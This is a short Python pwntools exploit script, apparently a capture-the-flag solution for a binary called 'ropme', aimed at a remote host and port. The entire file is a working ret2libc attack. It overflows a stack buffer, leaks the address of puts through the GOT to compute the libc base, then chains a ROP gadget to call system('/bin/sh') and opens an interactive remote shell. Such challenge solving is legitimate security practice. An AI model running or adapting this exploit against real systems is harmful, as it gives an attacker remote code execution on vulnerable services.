#!/usr/bin/python3

from pwn import *

context.log_level = 'DEBUG'
binary = './ropme' #Binary name
elf = context.binary = ELF(binary,checksec=False) #Automatically get contex,arch,os etc..
#io = process(binary)
io = remote('138.68.142.134', 30184)

#Binary enumeration
rsp_offset = 72 
pop_rdi = 0x4006d3
libc_puts = 0x06f690
libc_system = 0x45390
libc_sh = 0x18cd17

#Leaking payload
leaking_payload = rsp_offset * b'a' + p64(pop_rdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.symbols['main'])
io.sendlineafter('dah?' ,leaking_payload)
put_leaked_address = io.recvuntil('dah?').split()[0]
put_leaked_address = u64(put_leaked_address.ljust(8,b'\x00'))
log.success(f'Leaked put address at: {hex(put_leaked_address)}')

#Calculating libc base address
libc_base = put_leaked_address - libc_puts
log.success(f'Libc base address at: {hex(libc_base)}')

#System and /bin/sh
system = libc_base + libc_system
binsh = libc_base + libc_sh
log.info(f'System address: {hex(system)}')
log.info(f'/bin/sh address: {hex(binsh)}')

#Payload
payload = b'a' * rsp_offset + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()
